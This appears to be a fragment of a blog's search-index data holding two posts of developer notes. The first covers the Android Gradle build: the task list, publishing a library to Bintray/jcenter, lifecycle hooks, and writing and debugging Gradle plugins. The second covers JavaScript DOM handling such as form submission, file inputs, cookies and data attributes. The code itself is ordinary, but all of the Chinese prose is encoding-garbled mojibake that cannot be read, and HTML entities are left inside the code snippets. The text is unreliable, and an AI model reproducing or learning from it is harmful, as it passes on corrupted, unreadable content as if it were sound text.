actionBarDivider 0x7f030000int attr actionBarItemBackground 0x7f030001int attr actionBarPopupTheme 0x7f030002int attr actionBarSize 0x7f030003â€¦æŒ‰ç…§å­—æ¯ä»a-zå¼€å§‹ï¼Œhex valueè‡ªå¢(0x7få¼€å¤´) Android Studioä¸­ç‚¹å‡»runä¹‹åï¼Œæ‰§è¡Œäº†è¿™äº›tasks Task spend time: 2ms :app:preBuild 64ms :app:preDebugBuild 9ms :app:compileDebugAidl 4ms :app:compileDebugRenderscript 1ms :app:checkDebugManifest 2ms :app:generateDebugBuildConfig 1ms :app:prepareLintJar 1ms :app:generateDebugResValues 0ms :app:generateDebugResources 57ms :app:mergeDebugResources 1ms :app:createDebugCompatibleScreenManifests 4ms :app:processDebugManifest 1ms :app:splitsDiscoveryTaskDebug 18ms :app:processDebugResources 1ms :app:generateDebugSources 11ms :app:javaPreCompileDebug 10ms :app:compileDebugJavaWithJavac 1ms :app:compileDebugNdk 0ms :app:compileDebugSources 4ms :app:mergeDebugShaders 1ms :app:compileDebugShaders 0ms :app:generateDebugAssets 8ms :app:mergeDebugAssets 19ms :app:transformClassesWithDexBuilderForDebug 6ms :app:transformDexArchiveWithExternalLibsDexMergerForDebug 7ms :app:transformDexArchiveWithDexMergerForDebug 1ms :app:mergeDebugJniLibFolders 12ms :app:transformNativeLibsWithMergeJniLibsForDebug 10ms :app:transformNativeLibsWithStripDebugSymbolForDebug 0ms :app:processDebugJavaRes 24ms :app:transformResourcesWithMergeJavaResForDebug 2ms :app:validateSigningDebug 7ms :app:packageDebug 0ms :app:assembleDebug å¯ä»¥åˆ†æˆè¿™5ç±»å§ Preparation of dependencies. During this phase Gradle check that all libraries this module depends on are ready. If this module depends on another one, that module would be built as well. Merging resources and processing Manifest. After this phase resources and Manifest are ready to be packaged in the result file. Compiling. This phase started with Annotation Processors, in case you use them. Then source code is compiled into byte code. If you are using AspectJ, weaving also happens here. Postprocessing. All Gradle tasks with a â€œtransformâ€ prefix are part of this phase. Most important ones are: transformClassesWithMultidexlist and transformClassesWithDex. They produce .DEX files. Packaging and publishing. For libraries this stage means creating an .AAR file in the end, for applications â€” .APK. ç®€ä¹¦ä¸Šæœ‰äººæ€»ç»“äº† Gradleçš„Flavorèƒ½å¦é…ç½®sourceset?åœ¨sourceSetsä¸­å¯ä»¥è®¾ç½®ä¸åŒflavorå„è‡ªçš„java.srcDirså’Œres.srcDirs Product flavorsä¸€ä¸ªproduct flavorå®šä¹‰äº†ä»é¡¹ç›®ä¸­æ„å»ºäº†ä¸€ä¸ªåº”ç”¨çš„è‡ªå®šä¹‰ç‰ˆæœ¬ã€‚ä¸€ä¸ªå•ä¸€çš„é¡¹ç›®å¯ä»¥åŒæ—¶å®šä¹‰å¤šä¸ªä¸åŒçš„flavoræ¥æ”¹å˜åº”ç”¨çš„è¾“å‡ºã€‚Build Type + Product Flavor = Build Variantï¼ˆæ„å»ºç±»å‹+å®šåˆ¶äº§å“=æ„å»ºå˜ç§ç‰ˆæœ¬ï¼‰è¿™å¥è¯çš„æ„æ€å°±æ˜¯ï¼ŒBuildTypesæœ‰nç§ï¼Œproduct flavoræœ‰mç§ï¼Œæœ€ç»ˆå¯èƒ½çš„ç»„åˆæœ‰m*nç§Gradle Plugin User Guide ç¾å›¢å¤–å–Androidå¹³å°åŒ–æ¶æ„æ¼”è¿›å®è·µ gradle 4.4ä¹‹åClock è¢«Deprecatedçš„æ–¹æ¡ˆæ˜¯è‡ªå·±åˆ›å»ºä¸€ä¸ªgroovyæ–‡ä»¶ org.gradle.util.Clock() // è¢«Deprecatedä¹‹åçš„è§£å†³æ–¹æ¡ˆ building-android-apps 2. åˆ›å»ºjava Libraryå¹¶æäº¤åˆ°jcenterçš„æ–¹æ³•JFrog æ˜¯è½¯ä»¶ç®¡ç†å’Œåˆ†å‘çš„é¢†å…ˆé€šç”¨è§£å†³æ–¹æ¡ˆJFrog æ˜¯è½¯ä»¶ç®¡ç†å’Œåˆ†å‘çš„é¢†å…ˆé€šç”¨è§£å†³æ–¹æ¡ˆï¼ŒJFrog Bintrayï¼ˆé€šç”¨åˆ†å‘å¹³å°ï¼‰åªæ˜¯ä»–å®¶çš„ä¼—å¤šæœåŠ¡ä¹‹ä¸€ã€‚è¿™ä¸ªé€šç”¨åˆ†å‘å¹³å°ï¼Œå°±å½“CDNç”¨å¥½äº†ã€‚bintrayçš„æ³¨å†Œåœ°å€ã€‚æ³¨å†Œå¥½äº†ä¹‹åç™»å½•bintrayï¼Œåˆ›å»ºä¸€ä¸ªä»“åº“ï¼Œéšä¾¿èµ·åå­—ï¼Œæ¯”å¦‚å«mavenã€‚åœ¨build.gradleä¸­å°±å¯ä»¥å¼•å…¥ maven { url â€˜https://dl.bintray.com/yourusername/maven&#39; }compile â€˜com.yourusername:librayName:1.0.0â€™ åˆ°è¿™é‡Œï¼Œå°±å¯ä»¥è‡ªå·±ç›´æ¥ä½¿ç”¨äº†ã€‚è¦æƒ³æäº¤åˆ°jcenter(å°±æ˜¯è¯´ä¸ç”¨æ·»åŠ ä¸€ä¸ªmaven {url }è¿™æ ·çš„æº)ï¼Œjcenter(æ‰˜ç®¡åœ¨Bintrayç½‘ç«™ä¸Šçš„å®˜æ–¹åº“ï¼Œå®˜æ–¹å’Œæ™®é€šçš„åŒºåˆ«å°±æ˜¯æäº¤ä¸Šå»è¦å®¡æ ¸)å’ŒmavenCentralä¹Ÿæ˜¯ä»“åº“ã€‚åªä¸è¿‡æ˜¯æœ‰å®˜æ–¹ç»´æŠ¤çš„äº†ã€‚å› ä¸ºmavençš„æ ‡å‡†å†™æ³•æ˜¯ maven { url â€œhttps://someurl&quot; } // maven { url â€œhttps://jitpack.io&quot; } // æ¯”å¦‚è¯´jitpackä»“åº“ æ­£å„¿å…«ç»çš„ä¸Šä¼ åˆ°jcenterçš„æ–¹å¼ï¼šä¸€.åœ¨æœ€å¤–å±‚build.gradleä¸­æ·»åŠ  classpath â€˜com.github.dcendents:android-maven-gradle-plugin:1.3â€™ // classpath â€˜com.jfrog.bintray.gradle:gradle-bintray-plugin:1.6â€™ é…å¥½äº†å¤§æ¦‚é•¿è¿™æ · // Top-level build file where you can add configuration options common to all sub-projects/modules. buildscript { repositories { jcenter() google() } dependencies { classpath &#39;com.android.tools.build:gradle:3.0.1&#39; classpath &#39;com.github.dcendents:android-maven-gradle-plugin:1.4.1&#39; classpath &#39;com.jfrog.bintray.gradle:gradle-bintray-plugin:1.6&#39; // NOTE: Do not place your application dependencies here; they belong // in the individual module build.gradle files } } allprojects { repositories { jcenter() google() } } android-maven-gradle-pluginæ’ä»¶æ˜¯ç”¨æ¥æ‰“åŒ…Mavenæ‰€éœ€æ–‡ä»¶çš„ã€‚gradle-bintray-pluginæ’ä»¶æ˜¯ç”¨æ¥å°†ç”Ÿæˆçš„Mavenæ‰€éœ€æ–‡ä»¶ä¸Šä¼ åˆ°Bintrayçš„ã€‚ äºŒ.åœ¨library moduleçš„build.gradleä¸­æ·»åŠ  apply plugin: &#39;com.github.dcendents.android-maven&#39; apply plugin: &#39;com.jfrog.bintray&#39; // This is the library version used when deploying the artifact version = &quot;1.0.0&quot; def siteUrl = &#39;https://github.com/Haldir65/androidMedia&#39; // é¡¹ç›®çš„ä¸»é¡µ def gitUrl = &#39;https://github.com/Haldir65/androidMedia.git&#39; // Gitä»“åº“çš„url group = &quot;com.github.haldir65.starry&quot; // Maven Group ID for the artifactï¼Œä¸€èˆ¬å¡«ä½ å”¯ä¸€çš„åŒ…å install { repositories.mavenInstaller { // This generates POM.xml with proper parameters pom { project { packaging &#39;aar&#39; // Add your description here name &#39;Starry\\n&#39; + &#39;Starry night\\n&#39; + &#39;Paint your palette blue and grey&#39; url siteUrl // Set your license licenses { license { name &#39;The Apache Software License, Version 2.0&#39; url &#39;http://www.apache.org/licenses/LICENSE-2.0.txt&#39; } } developers { developer { id &#39;haldir&#39; //å¡«å†™çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ name &#39;johnDoe&#39; email &#39;mjw090608@gmail.com&#39; } } scm { connection gitUrl developerConnection gitUrl url siteUrl } } } } } task sourcesJar(type: Jar) { from android.sourceSets.main.java.srcDirs classifier = &#39;sources&#39; } task javadoc(type: Javadoc) { source = android.sourceSets.main.java.srcDirs classpath += project.files(android.getBootClasspath().join(File.pathSeparator)) } task javadocJar(type: Jar, dependsOn: javadoc) { classifier = &#39;javadoc&#39; from javadoc.destinationDir } artifacts { archives javadocJar archives sourcesJar } Properties properties = new Properties() properties.load(project.rootProject.file(&#39;local.properties&#39;).newDataInputStream()) bintray { user = properties.getProperty(&quot;bintray.user&quot;) key = properties.getProperty(&quot;bintray.apikey&quot;) configurations = [&#39;archives&#39;] pkg { repo = &quot;maven&quot; name = &quot;Starry&quot; //å‘å¸ƒåˆ°JCenterä¸Šçš„é¡¹ç›®åå­— websiteUrl = siteUrl vcsUrl = gitUrl licenses = [&quot;Apache-2.0&quot;] publish = true } } javadoc { //jav docé‡‡ç”¨utf-8ç¼–ç å¦åˆ™ä¼šæŠ¥â€œGBKçš„ä¸å¯æ˜ å°„å­—ç¬¦â€é”™è¯¯ options{ encoding &quot;UTF-8&quot; charSet &#39;UTF-8&#39; } } ä¸‰.åœ¨local.properitiesä¸­æ·»åŠ  bintray.user=your bintray usernamebintray.apikey=your apikey è®°å¾—æŠŠlocal.propertiesåŠ åˆ°gitignoreé‡Œé¢ï¼Œæå®š åœ¨éœ€è¦ä½¿ç”¨çš„moduleçš„build.gradleä¸­å¼•å…¥ buildscript { repositories { maven { url &#39;https://dl.bintray.com/haldir65/maven&#39; } } } dependencies { implementation &#39;com.github.haldir65.starry:starry:1.0.0&#39; } 3. Building LifeCycleç¼–è¯‘çš„å„ä¸ªé˜¶æ®µçš„hookæ­£å¦‚gradleå®˜ç½‘æ‰€ä»‹ç»çš„ï¼ŒBuildæµç¨‹åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µ(Initialization -&gt; Configuration -&gt; Execution) . The settings file is executed during the initialization phase. å³settings.gradleä¸­çš„è¯­å¥æ˜¯æœ€æ—©è¢«æ‰§è¡Œçš„ setting.gradle println â€˜This is executed during the initialization phase.â€™ build.gradleprintln &#39;This is executed during the configuration phase.&#39; task configured { println &#39;This is also executed during the configuration phase.&#39; } task test { doLast { println &#39;This is executed during the execution phase.&#39; } } task testBoth { doFirst { println &#39;This is executed first during the execution phase.&#39; } doLast { println &#39;This is executed last during the execution phase.&#39; } println &#39;This is executed during the configuration phase as well.&#39; } è¾“å‡º gradle test testBothThis is executed during the initialization phase.This is executed during the configuration phase.This is also executed during the configuration phase.This is executed during the configuration phase as well.:testThis is executed during the execution phase.:testBothThis is executed first during the execution phase.This is executed last during the execution phase.BUILD SUCCESSFUL in 0s2 actionable tasks: 2 executed ç»å¸¸ä¼šåœ¨build.gradleä¸­çœ‹åˆ°è¿™æ ·ä¸€æ®µ afterEvaluate { project -&gt; logger.info(&quot;=========afterEvaluate==============&quot;) project.tasks.each { task -&gt; if (task.name == &quot;test&quot;||task.name.contains(&quot;lint&quot;)){ task.enabled = false // æœ‰äº›ä¸å¿…è¦çš„ç¡®å®å¯ä»¥å‰”é™¤æ‰ } // task.enabled = false è¿™ä¹ˆå¹²çš„è¯å…¨éƒ¨ä»»åŠ¡éƒ½ä¸ä¼šæ‰§è¡Œ println(&quot;-------------${task.name}----&quot;) } } closureå°±æ˜¯ä¸€å¯¹èŠ±æ‹¬å·åŒ…ç€çš„ä¸œè¥¿afterEvaluateå‘ç”Ÿåœ¨Configurationä¹‹åï¼Œå®é™…ä¸Šä¹Ÿå°±æ˜¯åœ¨projecté…ç½®å®Œæˆåï¼Œå¼€å§‹æ‰§è¡Œæ‰€æœ‰taskå‰ï¼Œå¯¹å¤–æä¾›ä¸€ä¸ªclosureï¼Œå…¶å®beforeEvaluateä¹Ÿæœ‰ã€‚ immediately invoked after a task is added to a project åœ¨Taskè¢«æ·»åŠ åˆ°projectçš„æ—¶å€™æ‰§è¡Œclosure tasks.whenTaskAdded { task -&gt; task.ext.srcDir = &#39;src/main/java&#39; } task a println &quot;source dir is ${a.srcDir}&quot; project evaluateæœ‰å¯èƒ½æˆåŠŸï¼Œä¹Ÿä¼šå¤±è´¥ã€‚ä½†æ— è®ºæˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œä¸‹é¢çš„notificationéƒ½ä¼šè§¦å‘ gradle.afterProject {project, projectState -&gt; if (projectState.failure) { println &quot;Evaluation of $project FAILED&quot; } else { println &quot;Evaluation of $project succeeded&quot; } } åœ¨gradleçš„pluginä¸­å®ç°ä¹Ÿæœ‰ç±»ä¼¼çš„PluginImpl.groovy public class PluginImpl implements Plugin&lt;Project&gt; { void apply(Project project) { project.gradle.addProjectEvaluationListener() // å’Œåœ¨build.gradleä¸­afterEvaluateå·®ä¸å¤š project.getGradle().taskGraph.addTaskExecutionGraphListener() //åœ¨æ‰§è¡Œå‰ } } Task execution graph ready( graphPopulated,This method is called when the TaskExecutionGraph has been populated, and before any tasks are executed.)åœ¨ä»»ä½•taskæ‰§è¡Œå‰è¢«æ‰§è¡Œ Task execution(You can receive a notification immediately before and after any task is executed.)(TaskExecutionListener,åœ¨taskæ‰§è¡Œå‰å’Œæ‰§è¡Œå) project.gradle.addListener(new TaskExecutionListener() { @Override void beforeExecute(Task task) { } @Override void afterExecute(Task task, TaskState taskState) { } }) è€Œåœ¨build.gradleä¸­æ˜¯è¿™æ ·çš„å†™æ³• task ok task broken(dependsOn: ok) { group &#39;Welcome&#39; // è¿™ä¸ªæ˜¯taskçš„ä¸€ä¸ªå±æ€§ description &#39;Produces a greeting&#39; // è¿™ä¸ªæ˜¯åœ¨projectä¸­è¾“å…¥gradle tasksä¹‹åè¾“å‡ºçš„ä»»åŠ¡åˆ—è¡¨ä¸­æ¯ä¸€é¡¹åé¢çš„æè¿°ä¿¡æ¯ doLast { throw new RuntimeException(&#39;broken&#39;) } } gradle.taskGraph.beforeTask { Task task -&gt; println &quot;executing $task ...&quot; } gradle.taskGraph.afterTask { Task task, TaskState state -&gt; if (state.failure) { println &quot;FAILED&quot; } else { println &quot;done&quot; } } 4. How to create gradle Pluginæ•´ä½“çš„è¿‡ç¨‹å’Œè¿™é‡Œé¢è¯´çš„å·®ä¸å¤š add to your buidl script // ä¸å¯å¤ç”¨ åˆ›å»ºBuildSrcæ–‡ä»¶å¤¹ //ä¾æ—§ä¸å¯å¤ç”¨ åˆ›å»ºä¸€ä¸ªStandalone Project //å¯å¤ç”¨ public class GreetingPlugin implements Plugin&lt;Project&gt; { @Override public void apply(Project project) { project.task(&quot;hello&quot;) .doLast(task -&gt; System.out.println(&quot;Hello Gradle!&quot;)); } } ä½¿ç”¨Transform Apiåœ¨classå˜æˆdexä¹‹å‰å¯¹classè¿›è¡Œå­—èŠ‚ç ä¿®æ”¹æœ¬è´¨ä¸Šæ˜¯åœ¨merge{ProductFlavor}{BuildType}Assets Taskä¹‹åï¼ŒtransformClassesWithDexFor{ProductFlavor}{BuildType} Transform ä¹‹å‰,æ’å…¥ä¸€ä¸ªtransformClassesWith{YourTransformName}For{ProductFlavor}{BuildType} Transform 5. updateå¾…æŸ¥çœ‹ preBuild &lt;&lt; { String cmd = &quot;sh inrouter/maker/route.sh &quot; + project.getName() def cmdResult = cmd.execute().text.trim() println cmdResult } #echo &quot;Start make&quot; #javac -encoding utf-8 ./inrouter/maker/java/com/me/obo/maker/utils/*.java ./inrouter/maker/java/com/me/obo/maker/*.java -d inrouter/maker/class/ -cp inrouter/maker/libs/javapoet-1.9.0.jar #java -Djava.ext.dirs=inrouter/maker/libs -classpath inrouter/maker/class com.me.obo.maker.CodeMaker $1 $2 #echo &quot;End make&quot; Tinkerçš„gradle pluginå®ç°ï¼Œéå¸¸æœ‰å‚è€ƒæ„ä¹‰å’Œjava librarayæäº¤åˆ°jcenterä¸åŒï¼Œgradleéœ€è¦æäº¤åˆ°Gradle Plugin Portalã€‚æ²¡é”™ï¼Œä¸€ä¸ªå®Œå…¨ä¸ä¸€æ ·çš„ç½‘ç«™ æ˜æ˜å·²ç»æŠŠæ‰€æœ‰çš„åŒ…éƒ½æ”¹æˆimplementationäº†ï¼Œç¼–è¯‘å™¨è¿˜æ˜¯æŠ¥error ./gradlew :app:dependencies â€“configuration compile ##è¿™æ¡å‘½ä»¤å¯ä»¥æŸ¥è¯¢å½“å‰appä¸­è¿˜æœ‰å“ªæ¡ä¾èµ–åœ¨ç”¨compile åœ¨setting.gradleä¸­è¿™ä¹ˆå†™ä¹Ÿæ˜¯å¯ä»¥çš„ include â€˜:library1â€™project(â€˜:library1â€™).projectDir = new File(â€˜../StickyListHeader/library1â€™) buildScriptä¸­gradle libraryçš„æœç´¢é¡ºåºã€‚æ¯”å¦‚è‡ªå·±æ·»åŠ äº†ä¸€ä¸ª maven { url &#39;https://maven.google.com/&#39; name &#39;Google&#39; } åƒè¿™æ ·çš„repository ä¿¡ä¸ä¿¡ç”±ä½ ï¼Œbuild.gradleæ–‡ä»¶æœ‰æ—¶å€™æ˜¯ä»ä¸Šå¾€ä¸‹è¯»çš„ã€‚ buildTypes { release { minifyEnabled true proguardFiles getDefaultProguardFile(&#39;proguard-android.txt&#39;), &#39;proguard-rules.pro&#39; signingConfig signingConfigs.release shrinkResources true } debug { minifyEnabled false proguardFiles getDefaultProguardFile(&#39;proguard-android.txt&#39;), &#39;proguard-rules.pro&#39; } } // signingConfigså†™åœ¨ä¸‹é¢æ˜¯ä¸è®¤çš„ï¼ŒæŠŠè¿™ä¸ªsigningConfigsæŒªåˆ°ä¸Šé¢å°±è¡Œäº†ã€‚è¿™è·Ÿå¤šæ•°è¯­è¨€çš„å‡½æ•°å£°æ˜è¦å†™åœ¨å¼•ç”¨å‰å¤´æ˜¯ä¸€æ ·çš„ã€‚ signingConfigs { release { // ... } } å¦‚ä½•debug gradle pluginåœ¨å‘½ä»¤è¡Œé‡Œ./gradlew clean assembleDebug -Dorg.gradle.daemon=false -Dorg.gradle.debug=true //ä¸€ä¸ªæ˜¯noDaemon ä¸€ä¸ªæ˜¯debug=true (è¿™æ®µè¾“å…¥åå‘½ä»¤è¡Œä¼šå¡åœ¨è¿™é‡Œç­‰debugger attachä¸Šæ¥)ç„¶åç…§ç€åœ¨studioé‡Œé¢æ·»åŠ ä¸€ä¸ªremote debug.ç„¶åç‚¹å‡»è¿™ä¸ªdebugæŒ‰é’®Listening for transport dt_socket at address: 5005 //è¿™ä¸ªæ˜¯åœ¨ç­‰ç€To honour the JVM settings for this build a new JVM will be forked. Please consider using the daemon: https://docs.gradle.org/4.10.1/userguide/gradle_daemon.html. //è¿™ä¸ªæ˜¯ç‚¹äº†ä¸€æ¬¡é‚£ä¸ªdebugæŒ‰é’®Daemon will be stopped at the end of the build stopping after processing //è¿™ä¸ªæ˜¯æˆ‘åˆç‚¹äº†ä¸€æ¬¡ä¹‹åï¼Œç»ˆäºå¼€å§‹è¿è¡Œäº†(è¦ç‚¹ä¸¤æ¬¡ã€‚ã€‚ã€‚)æ•ˆæœæ˜¯é…±ç´«çš„ public class PluginImpl implements Plugin&lt;Project&gt; { void apply(Project project) { project.task(&#39;testTask&#39;).doLast{ println &quot;Hello gradle plugin&quot; } project.afterEvaluate { project.logger.error &quot;afterEvaluated&quot; //è¿™ä¸ªå…ˆæ‰§è¡Œ if (project.plugins.hasPlugin(&quot;com.android.application&quot;)) { def android = project.extensions.getByName(&quot;android&quot;) android.applicationVariants.all {ApplicationVariantImpl variant -&gt; //è¿™é‡Œä¼šå†’å‡ºæ¥debugå’Œreleaseçš„ä¸¤ç§variantï¼Œä¼¼ä¹android gradle plugin åœ¨3.5çš„æ—¶å€™ä¼šè®¾å®šlazyTask,å°±æ˜¯è¿™é‡Œåªä¼šæœ‰ä¸€ä¸ªdebug project.logger.error &quot;DebuggerPlugin:${variant}&quot; ApplicationVariantData apkVariantData = variant.getProperty(&#39;variantData&#39;) ApplicationVariantData variantData = variant.getVariantData() TestVariant testVariant = variant.getTestVariant() UnitTestVariant unitTestVariant = variant.getUnitTestVariant() } } } } } ä¸‹é¢è¿™ä¿©å…¶å®æ˜¯ä¸€æ ·çš„ï¼Œå…¶å®åœ¨gradleä¸­ï¼Œè¿™æ˜¯ä¸€ä¸ªæ–¹æ³•è°ƒç”¨ï¼Œå®ƒçš„æœ¬è´¨æ˜¯implementation()æ–¹æ³•ä¼ å…¥äº†ä¸€ä¸ªmapå‚æ•°ï¼Œå› æ­¤å®Œæ•´çš„å†™æ³•å®é™…ä¸Šæ˜¯è¿™æ ·çš„ï¼š implementation &#39;com.android.support:appcompat-v7:28.0.0&#39; implementation( group: &#39;com.android.support&#39;, name:&#39;appcompat-v7&#39;, version:&#39;28.0.0&#39;) errorOne of the classes is an explicit generated class using the class statement, the other is a class generated from the script body based on the file name. Solutions are to change the file name or to change the class name. å‡ºç°é”™è¯¯çš„åŸå› æ˜¯åœ¨classå¤–é¢è¿˜å†™äº†è¯­å¥ gradleçš„transitive æ˜¯æŒ‡ä¾èµ–æ˜¯å¦ä¼šä¼ é€’ é»˜è®¤transitive = true ï¼Œå°±æ˜¯è¯´ä¼šå»ä¸€ç›´ä¸‹è½½ä¸Šæ¸¸ä¾èµ–çš„åº“ï¼Œå¦åˆ™å°±æ˜¯è‡ªå·±å»æ·»åŠ è¿™äº›ä¸Šæ¸¸ä¾èµ–ã€‚ å‚è€ƒæ¯”è¾ƒå¤æ‚çš„gradle knowledgeofficial gradle docs æ˜¯æœ€å¥½çš„å­¦ä¹ èµ„æ–™custom_pluginsBuild Script Basicså…³äºAndroid Gradleä½ éœ€è¦çŸ¥é“è¿™äº›ï¼ˆ4ï¼‰Gradleæ’ä»¶å­¦ä¹ ç¬”è®°ï¼ˆå››)Android Gradle Plugin source Codegradle apiæŒªåˆ°google()ä»“åº“äº†","tags":[]},{"title":"DOMæ“ä½œæ‰‹å†Œ","date":"2018-02-02T23:30:25.000Z","path":"2018/02/02/2018-02-02-html-dom-manipulation/","text":"HTML Documentæ“ä½œæ‰‹å†Œ ä½¿ç”¨javaScriptæ“ä½œdomçš„è®°å½• æ‹¦æˆªformçš„submithow-to-prevent-form-from-being-submitted &lt;form onsubmit=&quot;return mySubmitFunction()&quot;&gt; &lt;label for=&quot;this is the text before the value&quot;type=&#39;text&#39;&gt;&lt;/label&gt; &lt;label type=&#39;text&#39;&gt;&lt;/label&gt; &lt;/form&gt; åœ¨mySubmitFunction()ä¸­return falseå¹¶ä¸èƒ½é˜»æ­¢è¡¨å•è¢«æäº¤ã€‚æ­£ç¡®çš„åšæ³• const element = document.querySelector(&#39;form&#39;); element.addEventListener(&#39;submit&#39;, event =&gt; { event.preventDefault(); // actual logic, e.g. validate the form console.log(&#39;Form submission cancelled.&#39;); }); aæ ‡ç­¾çš„äº‹ä»¶ç»‘å®š&lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:void(0)&quot;&gt;&lt;/a&gt; input fileé€‰å‡ºæ¥çš„å›¾ç‰‡è·¯å¾„c-fakepath.æµè§ˆå™¨å¹¶ä¸ä¼šå°†åº•å±‚çš„æ–‡ä»¶å®é™…è·¯å¾„æš´éœ²ç»™å¼€å‘è€…ï¼Œè¿™æ˜¯å‡ºäºå®‰å…¨è€ƒè™‘ã€‚æ‰€ä»¥ä½¿ç”¨ document.querySelectorAll(&#39;input&#39;)[3].value &quot;C:\\fakepath\\image_7.jpg&quot; //æ‰€ä»¥ä¸€èˆ¬è¦ç”¨string.split(&#39;\\\\&#39;)å¤„ç†ä¸€ä¸‹ è¢«document.getElementByIdå‘äº†ä¸€ä¸ªhtmlé¡µé¢åªèƒ½æœ‰ä¸€ä¸ªidçš„è§„åˆ™éƒ½çŸ¥é“ï¼Œå¯æ˜¯ååä¸€ä¸ªé¡µé¢å†™äº†ä¸¤ä¸ªidä¸€æ ·çš„tagï¼Œç½‘é¡µç…§æ ·è·‘ï¼Œconsoleæ²¡æœ‰ä»»ä½•æŠ¥é”™ã€‚ä½†æ˜¯ä½¿ç”¨document.getElementByIdçš„æ—¶å€™ï¼Œæ‹¿åˆ°çš„å°±æ˜¯ç¬¬ä¸€ä¸ªã€‚æµè§ˆå™¨è¿˜çœŸæ˜¯èƒ½å®¹é”™å•Šã€‚é¡ºä¾¿è®°å½•ä¸‹vanilla jså’ŒjQuery detect ä¸€ä¸ªfile inputçš„æ–¹æ³• const input2 = document.getElementById(&#39;file_2&#39;); input2.addEventListener(&#39;change&#39;, () =&gt; { showPreview2(this.id,&#39;portrait2&#39;); }) $(&#39;#file_2&#39;).on(&#39;change&#39;, () =&gt; { showPreview2(&#39;file_2&#39;,&#39;portrait2&#39;); }) $(&#39;#file_2&#39;).change( () =&gt; { showPreview2(this.id,&#39;portrait2&#39;); }) ä¸ºæ¯›æµè§ˆå™¨å†…åµŒè§†é¢‘è¦ç”¨iframeå› ä¸ºvideo sourceæ˜¯hoståœ¨å…¶ä»–çš„sitesçš„å•Šï¼Œå› ä¸ºè·¨åŸŸçš„é—®é¢˜ï¼Œä¸å¾—ä¸ä½¿ç”¨iframeã€‚å› ä¸ºå°±ç®—ç”¨iframeï¼Œé‡Œé¢å…¶å®è¿˜æ˜¯ä¸€ä¸ªvideoçš„tgã€‚ html jsæ˜¯ä¸èƒ½å†™æ–‡ä»¶çš„node jsæä¾›äº†fs apiæ¥è¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œæµè§ˆå™¨ä¸­jsä¸èƒ½è¯»å†™æœ¬åœ°æ–‡ä»¶ã€‚(html5æä¾›äº†localStorage apiï¼Œä½†æœ€å¤§å®¹é‡å¥½åƒæ˜¯5MBï¼Œé€šè¿‡æµè§ˆå™¨è¯»æ–‡ä»¶ä¹Ÿå¿…é¡»ç”¨æˆ·æ‰‹åŠ¨è§¦å‘é€‰æ‹©) å¤´ä¸€æ¬¡å¬è¯´noscriptè¿™ç§ä¸œè¥¿&lt;html&gt; &lt;body&gt; &lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; &lt;!-- document.write(&quot;Hello World!&quot;) //--&gt; &lt;/script&gt; &lt;noscript&gt; Sorry...JavaScript is needed to go ahead. &lt;/noscript&gt; &lt;/body&gt; &lt;/html&gt; å¦‚æœæµè§ˆå™¨ä¸æ”¯æŒjavascriptçš„è¯ï¼ŒnoScriptä¸­çš„å†…å®¹å°±ä¼šæ˜¾ç¤ºå‡ºæ¥ documentå¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•åœ¨mdnä¸Šéƒ½æœ‰jsæ“ä½œcookieçš„æ–¹å¼éšä¾¿å¼€ä¸€ä¸ªç½‘é¡µï¼Œåœ¨consoleä¸­è¾“å…¥document.cookieå°±å¯ä»¥çœ‹åˆ°è®¾ç½®çš„cookieæˆ–è€…åœ¨chromeçš„resource tabä¸­ä¹Ÿèƒ½çœ‹åˆ°jsèƒ½å¤Ÿæ“ä½œcookieçš„å‰ææ˜¯cookieä¸­æ²¡æœ‰HttpOnly=true å­—æ®µ document.cookie = &quot;key1=value1;key2=value2;expires=date&quot;; jsé‡Œé¢æ²¡æœ‰deleteCookieByNameOrDomainè¿™ç§æ–¹æ³• éƒ½æ˜¯ç”¨è®¾ç½®expireçš„æ–¹æ³•åˆ æ‰cookieï¼Œè¿˜æœ‰ä¸€äº›å‘ æµè§ˆå™¨ä¿¡æ¯ä¸€èˆ¬åœ¨Navigatorå¯¹è±¡é‡Œé¢æ‹¿var browsername=navigator.appName; if( browsername == &quot;Netscape&quot; ) { window.location=&quot;http://www.location.com/ns.htm&quot;; } else if ( browsername ==&quot;Microsoft Internet Explorer&quot;) { window.location=&quot;http://www.location.com/ie.htm&quot;; } else { window.location=&quot;http://www.location.com/other.htm&quot;; } navigatoré‡Œé¢å¸¸ç”¨çš„è¿˜æœ‰platform,userAgentç­‰éšä¾¿åœ¨chromeé‡Œé¢è¯•äº†ä¸‹navigator.appName ==&gt; Netscapenavigator.platform ==&gt; win32 åœ¨æµè§ˆå™¨é‡Œæ“ä½œcookieå¯ä»¥ç”¨åŸç”Ÿapiè‡ªå·±å»æ“ä½œstringï¼Œä½†æ¨èä½¿ç”¨æˆç†Ÿçš„åº“ æ–‡ä»¶ä¸Šä¼ ä¸€èˆ¬ä½¿ç”¨file tagå°±å¯ä»¥äº†è¿™ç§æ˜¯å•æ–‡ä»¶çš„ &lt;form action=&quot;&quot; method=post enctype=multipart/form-data&gt; &lt;input type=file name=file&gt; &lt;input type=submit value=Upload&gt; &lt;/form&gt; &lt;form action=&quot;/upload&quot; method=&quot;post&quot;&gt; é€‰æ‹©å›¾ç‰‡ï¼š&lt;input type=&quot;file&quot; name=&quot;img&quot; multiple=&quot;multiple&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt; &lt;/form&gt; &lt;p&gt;è¯·å°è¯•åœ¨æµè§ˆæ–‡ä»¶æ—¶é€‰å–ä¸€ä¸ªä»¥ä¸Šçš„æ–‡ä»¶ã€‚&lt;/p&gt; htmlä¸­æœ‰dataæ ‡ç­¾æ–‡æ¡£ &lt;article id=&quot;electriccars&quot; data-columns=&quot;3&quot; data-index-number=&quot;12314&quot; data-parent=&quot;cars&quot;&gt; ... &lt;/article&gt; jsé‡Œé¢å¯ä»¥è¿™æ ·å»è·å–å¯¹åº”çš„å€¼ var article = document.getElementById(&#39;electriccars&#39;); article.dataset.columns // &quot;3&quot; article.dataset.indexNumber // &quot;12314&quot; æ³¨æ„dashè¢«æ›¿æ¢æˆäº†CamelCase article.dataset.parent // 